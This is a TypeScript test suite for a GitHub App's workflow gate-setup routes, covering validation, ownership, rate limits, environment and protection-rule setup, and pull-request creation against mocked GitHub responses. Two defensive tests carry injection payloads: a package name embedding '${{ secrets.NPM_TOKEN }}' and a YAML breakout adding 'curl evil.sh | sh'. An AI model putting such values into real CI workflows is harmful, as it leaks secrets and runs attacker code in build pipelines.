import { createExecutionContext, env, waitOnExecutionContext } from "cloudflare:test";
import { eq } from "drizzle-orm";
import { Hono } from "hono";
import { afterEach, beforeEach, describe, expect, test, vi } from "vitest";
import { createDb } from "../../server/db/client";
import { ensurePersonalOrganization } from "../../server/db/organizations";
import * as schema from "../../server/db/schema";
import { describeAuditEvent } from "../../server/lib/auth/audit-events";
import { upsertInstallation } from "../../server/lib/github-app/persistence";
import { githubAppRoutes } from "../../server/routes/github-app";
import { exhaustedRateLimitBindings } from "./rate-limit-doubles";
import type { Bindings, Variables } from "../../server/types";

/**
 * Routes for the guided gate-setup wizard.
 *
 * The interesting surface is not the happy path — it is what happens when the
 * installation lacks a permission. Those responses must stay 200s carrying a
 * `failed` step, because the wizard renders a manual fallback from them; turning
 * them into HTTP errors would dead-end the flow.
 */

const APP_ID = "12345";
const originalFetch = globalThis.fetch;

let testPrivateKeyPem: string | null = null;
async function getTestPrivateKeyPem(): Promise<string> {
  if (testPrivateKeyPem) return testPrivateKeyPem;
  const keyPair = (await crypto.subtle.generateKey(
    {
      name: "RSASSA-PKCS1-v1_5",
      modulusLength: 2048,
      publicExponent: new Uint8Array([1, 0, 1]),
      hash: "SHA-256",
    },
    true,
    ["sign", "verify"],
  )) as CryptoKeyPair;
  const pkcs8 = await crypto.subtle.exportKey("pkcs8", keyPair.privateKey);
  let binary = "";
  for (const byte of new Uint8Array(pkcs8)) binary += String.fromCharCode(byte);
  const base64 = btoa(binary);
  const lines = base64.match(/.{1,64}/g)?.join("\n") ?? base64;
  testPrivateKeyPem = `-----BEGIN PRIVATE KEY-----\n${lines}\n-----END PRIVATE KEY-----`;
  return testPrivateKeyPem;
}

async function seedUser(): Promise<{ userId: string; organizationId: string }> {
  const db = createDb(env.DB);
  const now = new Date();
  const userId = `user_${crypto.randomUUID()}`;
  await db.insert(schema.user).values({
    id: userId,
    name: "Tester",
    email: `${userId}@example.com`,
    emailVerified: true,
    createdAt: now,
    updatedAt: now,
  });
  const organizationId = await ensurePersonalOrganization(db, { userId });
  return { userId, organizationId };
}

function seedInstallation(organizationId: string) {
  return upsertInstallation(createDb(env.DB), {
    organizationId,
    installationId: `${Math.floor(Math.random() * 1e9)}`,
    accountLogin: "octo",
    accountType: "Organization",
    targetType: "Organization",
    status: "active",
    createdByUserId: null,
  });
}

function buildTestApp(userId: string) {
  const app = new Hono<{ Bindings: Bindings; Variables: Variables }>();
  app.use("*", async (c, next) => {
    c.set("authSession", { userId });
    await next();
  });
  app.route("/api/v1/github-app", githubAppRoutes);
  return app;
}

async function call(
  app: Hono<{ Bindings: Bindings; Variables: Variables }>,
  path: string,
  body: unknown,
  envOverrides: Partial<Bindings> = {},
) {
  const ctx = createExecutionContext();
  const routeEnv: Bindings = {
    ...env,
    GITHUB_APP_ID: APP_ID,
    GITHUB_APP_SLUG: "drydock-test",
    GITHUB_APP_CLIENT_ID: "client-id",
    GITHUB_APP_CLIENT_SECRET: "client-secret",
    GITHUB_APP_PRIVATE_KEY: await getTestPrivateKeyPem(),
    GITHUB_APP_WEBHOOK_SECRET: "webhook-secret-value-1234567890",
    GITHUB_APP_STATE_SECRET: "0123456789abcdef0123456789abcdef",
    BETTER_AUTH_SECRET: "fallback-secret-with-enough-entropy-aaaaaaaa",
    ...envOverrides,
  };
  const res = await app.fetch(
    new Request(`http://test.local${path}`, {
      method: "POST",
      body: JSON.stringify(body),
      headers: { "content-type": "application/json" },
    }),
    routeEnv,
    ctx,
  );
  await waitOnExecutionContext(ctx);
  return res;
}

/** Every gate-setup call starts by minting an installation token. */
function githubDouble(
  handler: (request: Request) => Promise<Response> | Response,
): typeof globalThis.fetch {
  return vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
    const request = input instanceof Request ? input : new Request(input, init);
    if (request.url.includes("/access_tokens")) {
      return Response.json({ token: "ghs_install_token", expires_at: "2099-01-01T00:00:00Z" });
    }
    return handler(request);
  }) as unknown as typeof globalThis.fetch;
}

function draft(installationRowId: string, overrides: Record<string, unknown> = {}) {
  return {
    installationRowId,
    repositoryFullName: "octo/widgets",
    environment: "Production",
    ecosystem: "npm",
    packageName: "@acme/widgets",
    ...overrides,
  };
}

async function readGateSetupEvents(organizationId: string) {
  return createDb(env.DB)
    .select()
    .from(schema.scanEvents)
    .where(eq(schema.scanEvents.organizationId, organizationId));
}

afterEach(() => {
  globalThis.fetch = originalFetch;
});

describe("gate-setup validation and ownership", () => {
  test("rejects a draft with no repository", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = vi.fn();

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/environment",
      draft(installation.id, { repositoryFullName: "" }),
    );

    expect(res.status).toBe(400);
    expect(await res.json()).toMatchObject({ error: "repositoryFullName is required" });
    expect(globalThis.fetch).not.toHaveBeenCalled();
  });

  test("rejects a repository that is not owner/repo", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = vi.fn();

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/environment",
      draft(installation.id, { repositoryFullName: "octo/widgets/extra" }),
    );

    expect(res.status).toBe(400);
    expect(globalThis.fetch).not.toHaveBeenCalled();
  });

  test("rejects a disallowed environment name before mutating GitHub", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = vi.fn();

    // 129 characters: accepted by GitHub, refused by the template step. Without
    // up-front validation this created an environment and a protection rule and
    // only failed once the workflow had to be generated.
    for (const path of ["environment", "protection-rule"]) {
      const res = await call(
        buildTestApp(userId),
        `/api/v1/github-app/gate-setup/${path}`,
        draft(installation.id, { environment: "e".repeat(129) }),
      );
      expect(res.status).toBe(400);
      expect(await res.json()).toMatchObject({ code: "invalid_input" });
    }
    expect(globalThis.fetch).not.toHaveBeenCalled();
  });

  test("rejects a disallowed package name even on the steps that ignore the template", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = vi.fn();

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/environment",
      draft(installation.id, { packageName: "pkg${{ secrets.NPM_TOKEN }}" }),
    );

    expect(res.status).toBe(400);
    expect(await res.json()).toMatchObject({ code: "invalid_input" });
    expect(globalThis.fetch).not.toHaveBeenCalled();
  });

  test("404s an installation another organization owns", async () => {
    const caller = await seedUser();
    const other = await seedUser();
    const installation = await seedInstallation(other.organizationId);
    globalThis.fetch = vi.fn();

    const res = await call(
      buildTestApp(caller.userId),
      "/api/v1/github-app/gate-setup/environment",
      draft(installation.id),
    );

    expect(res.status).toBe(404);
    expect(await res.json()).toMatchObject({ code: "installation_missing" });
    expect(globalThis.fetch).not.toHaveBeenCalled();
  });

  test("503s when the GitHub App is not configured on the Worker", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = vi.fn();

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/environment",
      draft(installation.id),
      { GITHUB_APP_ID: undefined },
    );

    expect(res.status).toBe(503);
    expect(await res.json()).toMatchObject({ code: "github_app_not_configured" });
    expect(globalThis.fetch).not.toHaveBeenCalled();
  });

  test("429s and never calls GitHub when the org is over its setup budget", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    const { overrides } = exhaustedRateLimitBindings();
    globalThis.fetch = vi.fn();

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/pull-request",
      draft(installation.id),
      overrides as Partial<Bindings>,
    );

    expect(res.status).toBe(429);
    expect(globalThis.fetch).not.toHaveBeenCalled();
  });
});

describe("gate-setup preview", () => {
  test("returns the ecosystem's workflow with the draft interpolated", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = vi.fn();

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/preview",
      draft(installation.id),
    );

    expect(res.status).toBe(200);
    const body = (await res.json()) as { workflowPath: string; yaml: string; notes: string[] };
    expect(body.workflowPath).toBe(".github/workflows/drydock-npm-release.yml");
    // The environment is normalized before it reaches the adapter, so the YAML
    // names the environment GitHub will actually create.
    expect(body.yaml).toContain('environment: "production"');
    expect(body.yaml).toContain('name: "Publish @acme/widgets"');
    expect(body.notes.length).toBeGreaterThan(0);
    // Pure computation: the preview must not spend the installation's GitHub budget.
    expect(globalThis.fetch).not.toHaveBeenCalled();
    expect(await readGateSetupEvents(organizationId)).toEqual([]);
  });

  test("400s an ecosystem with no gate setup template", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = vi.fn();

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/preview",
      draft(installation.id, { ecosystem: "atpm" }),
    );

    expect(res.status).toBe(400);
    expect(await res.json()).toMatchObject({ code: "unsupported_ecosystem" });
  });

  test("400s a package name that could break out of the YAML scalar", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = vi.fn();

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/preview",
      draft(installation.id, { packageName: 'x"\n      - run: curl evil.sh | sh' }),
    );

    expect(res.status).toBe(400);
    expect(await res.json()).toMatchObject({ code: "invalid_input" });
  });
});

describe("gate-setup environment step", () => {
  test("creates the environment when GitHub does not have it yet", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    const methods: string[] = [];
    globalThis.fetch = githubDouble((request) => {
      methods.push(`${request.method} ${new URL(request.url).pathname}`);
      if (request.method === "GET") return new Response(null, { status: 404 });
      return Response.json({ name: "production" });
    });

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/environment",
      draft(installation.id),
    );

    expect(res.status).toBe(200);
    expect(await res.json()).toMatchObject({
      step: { step: "environment", status: "created" },
    });
    expect(methods).toEqual([
      "GET /repos/octo/widgets/environments/production",
      "PUT /repos/octo/widgets/environments/production",
    ]);
    expect(await readGateSetupEvents(organizationId)).toMatchObject([
      {
        organizationId,
        actorUserId: userId,
        type: "github_app_gate_setup.environment_created",
        metadataJson: {
          repositoryFullName: "octo/widgets",
          environment: "production",
        },
      },
    ]);
    const [event] = await readGateSetupEvents(organizationId);
    expect(describeAuditEvent(event.type, event.metadataJson)).toEqual({
      category: "integration",
      label: "GitHub environment created",
      severity: "notice",
      detail: "octo/widgets · production",
    });
  });

  test("preserves a successful external mutation when the audit insert fails", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    const triggerName = `reject_gate_setup_audit_${crypto.randomUUID().replace(/-/g, "_")}`;
    await env.DB.prepare(`
      CREATE TRIGGER ${triggerName}
      BEFORE INSERT ON scan_events
      WHEN NEW.type = 'github_app_gate_setup.environment_created'
      BEGIN
        SELECT RAISE(FAIL, 'forced gate setup audit failure');
      END
    `).run();
    const methods: string[] = [];
    globalThis.fetch = githubDouble((request) => {
      methods.push(request.method);
      if (request.method === "GET") return new Response(null, { status: 404 });
      return Response.json({ name: "production" });
    });

    try {
      const res = await call(
        buildTestApp(userId),
        "/api/v1/github-app/gate-setup/environment",
        draft(installation.id),
      );
      expect(res.status).toBe(200);
      expect(await res.json()).toMatchObject({
        step: { step: "environment", status: "created" },
      });
      expect(methods).toEqual(["GET", "PUT"]);
      expect(await readGateSetupEvents(organizationId)).toEqual([]);
    } finally {
      await env.DB.prepare(`DROP TRIGGER IF EXISTS ${triggerName}`).run();
    }
  });

  test("leaves an existing environment untouched", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    const methods: string[] = [];
    globalThis.fetch = githubDouble((request) => {
      methods.push(request.method);
      return Response.json({ name: "production" });
    });

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/environment",
      draft(installation.id),
    );

    expect(await res.json()).toMatchObject({
      step: { step: "environment", status: "already_configured" },
    });
    // A PUT here would clear the maintainer's reviewers and wait timers.
    expect(methods).toEqual(["GET"]);
    expect(await readGateSetupEvents(organizationId)).toEqual([]);
  });

  test("degrades a 403 into an actionable manual fallback, not an error status", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = githubDouble((request) =>
      request.method === "GET"
        ? new Response(null, { status: 404 })
        : new Response("no", { status: 403 }),
    );

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/environment",
      draft(installation.id),
    );

    expect(res.status).toBe(200);
    const body = (await res.json()) as {
      step: { status: string; failure: { code: string; manualFallback: string } };
    };
    expect(body.step.status).toBe("failed");
    expect(body.step.failure.code).toBe("permission_denied");
    expect(body.step.failure.manualFallback).toContain("Environments");
    expect(await readGateSetupEvents(organizationId)).toEqual([]);
  });
});

describe("gate-setup protection rule step", () => {
  test("enables Drydock as the environment's custom protection rule", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    let posted: { integration_id?: number } | null = null;
    globalThis.fetch = githubDouble(async (request) => {
      if (request.method === "GET")
        return Response.json({ custom_deployment_protection_rules: [] });
      posted = (await request.json()) as { integration_id?: number };
      return Response.json({ id: 7 }, { status: 201 });
    });

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/protection-rule",
      draft(installation.id),
    );

    expect(await res.json()).toMatchObject({
      step: { step: "protection_rule", status: "created" },
    });
    expect(posted).toEqual({ integration_id: Number(APP_ID) });
    expect(await readGateSetupEvents(organizationId)).toMatchObject([
      {
        organizationId,
        actorUserId: userId,
        type: "github_app_gate_setup.protection_rule_enabled",
        metadataJson: {
          repositoryFullName: "octo/widgets",
          environment: "production",
        },
      },
    ]);
    const [event] = await readGateSetupEvents(organizationId);
    expect(describeAuditEvent(event.type, event.metadataJson)).toEqual({
      category: "integration",
      label: "Drydock protection rule enabled",
      severity: "notice",
      detail: "octo/widgets · production",
    });
  });

  test("is idempotent when the rule is already enabled", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    let posts = 0;
    globalThis.fetch = githubDouble((request) => {
      if (request.method === "GET") {
        return Response.json({
          custom_deployment_protection_rules: [
            { id: 3, app: { id: Number(APP_ID), slug: "drydock" } },
          ],
        });
      }
      posts += 1;
      return new Response(null, { status: 422 });
    });

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/protection-rule",
      draft(installation.id),
    );

    expect(await res.json()).toMatchObject({
      step: { step: "protection_rule", status: "already_configured" },
    });
    expect(posts).toBe(0);
    expect(await readGateSetupEvents(organizationId)).toEqual([]);
  });

  test("treats a 422 duplicate that re-reads as enabled as success", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    let gets = 0;
    globalThis.fetch = githubDouble((request) => {
      if (request.method === "GET") {
        gets += 1;
        // First read shows nothing (a race); the recheck sees the rule.
        return Response.json({
          custom_deployment_protection_rules:
            gets === 1 ? [] : [{ id: 3, app: { id: Number(APP_ID) } }],
        });
      }
      return new Response(null, { status: 422 });
    });

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/protection-rule",
      draft(installation.id),
    );

    expect(await res.json()).toMatchObject({
      step: { step: "protection_rule", status: "already_configured" },
    });
  });
});

describe("gate-setup pull request step", () => {
  /** Branch refs the double saw created and deleted, in call order. */
  let refCalls: string[] = [];

  const repoResponses = (overrides: Record<string, () => Response> = {}) =>
    githubDouble(async (request) => {
      const url = new URL(request.url);
      const key = `${request.method} ${url.pathname}`;
      if (overrides[key]) return overrides[key]();
      if (request.method === "DELETE" && url.pathname.includes("/git/refs/heads/")) {
        refCalls.push(`delete ${url.pathname.split("/git/refs/heads/")[1]}`);
        return new Response(null, { status: 204 });
      }
      if (key === "POST /repos/octo/widgets/git/refs") {
        const payload = (await request.json()) as { ref: string };
        refCalls.push(`create ${payload.ref.replace("refs/heads/", "")}`);
        return Response.json({}, { status: 201 });
      }
      if (key === "GET /repos/octo/widgets") return Response.json({ default_branch: "main" });
      if (key === "GET /repos/octo/widgets/git/ref/heads/main") {
        return Response.json({ object: { sha: "a".repeat(40) } });
      }
      if (key === "POST /repos/octo/widgets/git/refs") return Response.json({}, { status: 201 });
      if (url.pathname.startsWith("/repos/octo/widgets/contents/")) {
        return Response.json({ content: {} }, { status: 201 });
      }
      if (key === "POST /repos/octo/widgets/pulls") {
        return Response.json(
          { number: 42, html_url: "https://github.com/octo/widgets/pull/42" },
          { status: 201 },
        );
      }
      throw new Error(`unexpected GitHub call: ${key}`);
    });

  beforeEach(() => {
    refCalls = [];
  });

  test("commits the workflow on a new branch and opens the PR", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    let committedPath = "";
    let committedYaml = "";
    let prBody = "";
    globalThis.fetch = githubDouble(async (request) => {
      const url = new URL(request.url);
      const key = `${request.method} ${url.pathname}`;
      if (key === "GET /repos/octo/widgets") return Response.json({ default_branch: "main" });
      if (key === "GET /repos/octo/widgets/git/ref/heads/main") {
        return Response.json({ object: { sha: "a".repeat(40) } });
      }
      if (key === "POST /repos/octo/widgets/git/refs") return Response.json({}, { status: 201 });
      if (url.pathname.startsWith("/repos/octo/widgets/contents/")) {
        committedPath = decodeURIComponent(
          url.pathname.replace("/repos/octo/widgets/contents/", ""),
        );
        const payload = (await request.json()) as { content: string };
        committedYaml = new TextDecoder().decode(
          Uint8Array.from(atob(payload.content), (char) => char.charCodeAt(0)),
        );
        return Response.json({ content: {} }, { status: 201 });
      }
      if (key === "POST /repos/octo/widgets/pulls") {
        prBody = ((await request.json()) as { body: string }).body;
        return Response.json(
          { number: 42, html_url: "https://github.com/octo/widgets/pull/42" },
          { status: 201 },
        );
      }
      throw new Error(`unexpected GitHub call: ${key}`);
    });

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/pull-request",
      draft(installation.id),
    );

    expect(res.status).toBe(200);
    const body = (await res.json()) as {
      step: { status: string };
      pullRequest: { number: number; url: string; branch: string };
      yaml: string;
    };
    expect(body.step.status).toBe("created");
    expect(body.pullRequest.number).toBe(42);
    expect(body.pullRequest.branch).toMatch(/^drydock\/workflow-gate-/);
    expect(committedPath).toBe(".github/workflows/drydock-npm-release.yml");
    expect(committedYaml).toBe(body.yaml);
    expect(committedYaml).toContain('environment: "production"');
    // The PR body carries the hardening checklist a reviewer needs.
    expect(prBody).toContain("trusted publisher");
    expect(prBody).toContain("Allow administrators to bypass configured protection rules");
    expect(await readGateSetupEvents(organizationId)).toMatchObject([
      {
        organizationId,
        actorUserId: userId,
        type: "github_app_gate_setup.pull_request_created",
        metadataJson: {
          repositoryFullName: "octo/widgets",
          environment: "production",
        },
      },
    ]);
    const [event] = await readGateSetupEvents(organizationId);
    expect(describeAuditEvent(event.type, event.metadataJson)).toEqual({
      category: "integration",
      label: "Workflow setup pull request created",
      severity: "notice",
      detail: "octo/widgets · production",
    });
  });

  test("maps a refused .github/workflows write to workflow_scope_missing and still returns the YAML", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = repoResponses({
      "PUT /repos/octo/widgets/contents/.github/workflows/drydock-npm-release.yml": () =>
        new Response("refusing to allow a GitHub App to create or update workflow", {
          status: 403,
        }),
    });

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/pull-request",
      draft(installation.id),
    );

    expect(res.status).toBe(200);
    const body = (await res.json()) as {
      step: { status: string; failure: { code: string; manualFallback: string } };
      pullRequest: null;
      yaml: string;
    };
    expect(body.step.status).toBe("failed");
    expect(body.step.failure.code).toBe("workflow_scope_missing");
    expect(body.pullRequest).toBeNull();
    // The manual fallback is only usable if the exact bytes come back with it.
    expect(body.yaml).toContain('environment: "production"');
    expect(body.step.failure.manualFallback).toContain(".github/workflows/drydock-npm-release.yml");
    // This refusal is the expected outcome for most installations, so the branch
    // it created must not survive it.
    expect(refCalls).toHaveLength(2);
    expect(refCalls[0]).toMatch(/^create drydock\/workflow-gate-/);
    expect(refCalls[1]).toBe(refCalls[0].replace("create ", "delete "));
    expect(await readGateSetupEvents(organizationId)).toEqual([]);
  });

  test("reports an existing workflow file as already_exists instead of overwriting it", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = repoResponses({
      "PUT /repos/octo/widgets/contents/.github/workflows/drydock-npm-release.yml": () =>
        new Response(null, { status: 422 }),
    });

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/pull-request",
      draft(installation.id),
    );

    const body = (await res.json()) as { step: { failure: { code: string } } };
    expect(body.step.failure.code).toBe("already_exists");
    expect(refCalls.filter((entry) => entry.startsWith("delete "))).toHaveLength(1);
  });

  test("cleans up the branch when the pull request itself is refused", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = repoResponses({
      "POST /repos/octo/widgets/pulls": () => new Response(null, { status: 403 }),
    });

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/pull-request",
      draft(installation.id),
    );

    const body = (await res.json()) as { step: { failure: { code: string } } };
    expect(body.step.failure.code).toBe("permission_denied");
    expect(refCalls.filter((entry) => entry.startsWith("delete "))).toHaveLength(1);
  });

  test("keeps the branch when cleanup itself fails, and still reports the original failure", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = githubDouble(async (request) => {
      const url = new URL(request.url);
      const key = `${request.method} ${url.pathname}`;
      if (key === "GET /repos/octo/widgets") return Response.json({ default_branch: "main" });
      if (key === "GET /repos/octo/widgets/git/ref/heads/main") {
        return Response.json({ object: { sha: "a".repeat(40) } });
      }
      if (key === "POST /repos/octo/widgets/git/refs") return Response.json({}, { status: 201 });
      if (request.method === "DELETE") return new Response(null, { status: 403 });
      if (url.pathname.startsWith("/repos/octo/widgets/contents/")) {
        return new Response(null, { status: 403 });
      }
      throw new Error(`unexpected GitHub call: ${key}`);
    });

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/pull-request",
      draft(installation.id),
    );

    expect(res.status).toBe(200);
    const body = (await res.json()) as { step: { failure: { code: string } } };
    expect(body.step.failure.code).toBe("workflow_scope_missing");
  });

  test("does not delete the branch on the happy path", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = repoResponses();

    await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/pull-request",
      draft(installation.id),
    );

    expect(refCalls.filter((entry) => entry.startsWith("delete "))).toHaveLength(0);
  });

  test("fails cleanly on an empty repository with no default-branch head", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = repoResponses({
      "GET /repos/octo/widgets/git/ref/heads/main": () => new Response(null, { status: 404 }),
    });

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/pull-request",
      draft(installation.id),
    );

    expect(res.status).toBe(200);
    const body = (await res.json()) as { step: { status: string; failure: { code: string } } };
    expect(body.step.status).toBe("failed");
    expect(body.step.failure.code).toBe("repository_not_accessible");
  });
});
